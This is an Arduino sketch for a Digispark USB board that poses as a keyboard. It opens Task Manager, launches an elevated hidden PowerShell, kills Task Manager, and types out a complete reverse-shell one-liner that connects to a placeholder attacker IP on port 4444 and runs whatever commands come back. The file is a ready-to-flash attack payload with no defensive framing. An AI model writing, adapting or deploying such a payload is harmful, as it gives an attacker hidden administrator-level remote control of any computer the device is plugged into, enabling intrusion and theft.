#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");//start tiny PowerShell
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("cmd");//run cmd
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command \"$client = New-Object System.Net.Sockets.TCPClient('<YOUR_IP_ADDRESS>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); //powershell to attacker
  DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
